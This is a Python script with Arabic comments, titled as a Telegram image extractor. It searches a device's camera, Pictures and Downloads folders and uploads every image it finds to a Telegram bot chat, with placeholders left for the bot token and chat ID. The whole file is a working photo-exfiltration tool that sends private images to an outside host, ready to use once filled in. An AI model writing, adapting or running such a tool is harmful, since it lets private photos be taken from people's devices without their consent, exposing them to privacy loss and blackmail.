# Telegram Bot Image Extractor - كود استخراج الصور وإرسالها عبر تيليجرام

import os
import requests
import time

BOTTOKEN = "ضع_التوكن_هنا"
CHATID = "ضع_الآيدي_هنا"

def get_image_files(directory):
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    
    if not os.path.exists(directory):
        return []
    
    try:
        files = [f for f in os.listdir(directory) 
                if f.lower().endswith(extensions)]
        return files
    except PermissionError:
        return []

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{BOTTOKEN}/sendPhoto"
    
    if BOTTOKEN == "ضع_التوكن_هنا" or CHATID == "ضع_الآيدي_هنا":
        print("⚠️ خطأ: يرجى تعديل التوكن والـ Chat ID أولاً!")
        return False
    
    try:
        if not os.path.exists(file_path):
            print(f"❌ الملف غير موجود: {file_path}")
            return False
        
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            print(f"❌ الملف كبير جداً: {file_path}")
            return False
        
        with open(file_path, 'rb') as photo:
            payload = {'chat_id': CHATID}
            files = {'photo': photo}
            response = requests.post(url, data=payload, files=files, timeout=10)
            
            if response.status_code == 200:
                print(f"✅ تم الإرسال: {os.path.basename(file_path)}")
                return True
            else:
                print(f"❌ فشل الإرسال: {response.json()}")
                return False
                
    except Exception as e:
        print(f"❌ خطأ: {str(e)}")
        return False

def start_extraction():
    if os.name == 'nt':
        paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Pictures'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
        ]
    else:
        paths = [
            '/sdcard/DCIM/Camera',
            os.path.expanduser('~/Pictures'),
            os.path.expanduser('~/Downloads'),
        ]
    
    target_path = None
    for path in paths:
        if os.path.exists(path):
            target_path = path
            break
    
    if not target_path:
        print("❌ لم يتم العثور على مجلد صور!")
        return
    
    print(f"📁 جاري البحث في: {target_path}")
    
    images = get_image_files(target_path)
    
    if not images:
        print("⚠️ لم يتم العثور على صور.")
        return
    
    print(f"📊 عدد الصور: {len(images)}")
    print("-" * 50)
    
    for idx, image in enumerate(images, 1):
        full_path = os.path.join(target_path, image)
        print(f"[{idx}/{len(images)}] جاري الإرسال: {image}")
        send_photo(full_path)
        time.sleep(1)
    
    print("-" * 50)
    print("✅ انتهى!")

if __name__ == "__main__":
    try:
        start_extraction()
    except KeyboardInterrupt:
        print("\n⏸️ تم الإيقاف.")
    except Exception as e:
        print(f"❌ خطأ: {str(e)}")
